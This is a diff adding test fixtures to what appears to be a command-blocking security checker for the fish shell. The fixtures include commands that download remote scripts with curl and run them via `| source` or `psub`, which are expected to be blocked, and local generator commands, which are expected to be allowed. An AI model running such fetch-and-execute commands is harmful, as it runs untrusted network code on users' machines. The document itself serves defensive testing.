@@ -2922,3 +2922,45 @@ context = "exec"
 shell = "fish"
 expected_action = "block"
 expected_rules = ["curl_pipe_shell"]
+
+# ── 0.5.0 fix round C2: fish `| source`, psub, and heredoc readers ──────────
+# fish `source` with no file reads standard input: the canonical fisher
+# installer runs the download. A local generator piped into `source` is
+# ordinary fish setup.
+[[fixture]]
+name = "fish_curl_pipe_source_fisher_installer"
+min_milestone = 1
+input = "curl -sL https://raw.githubusercontent.com/jorgebucaran/fisher/main/functions/fisher.fish | source && fisher install jorgebucaran/fisher"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "fish_source_psub_download"
+min_milestone = 1
+input = "source (curl -fsSL https://example.com/i.fish | psub)"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "fish_local_generator_pipe_source_allowed"
+min_milestone = 1
+input = "starship init fish | source"
+context = "exec"
+shell = "fish"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
+
+[[fixture]]
+name = "fish_local_generator_source_psub_allowed"
+min_milestone = 1
+input = "source (zoxide init fish | psub)"
+context = "exec"
+shell = "fish"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
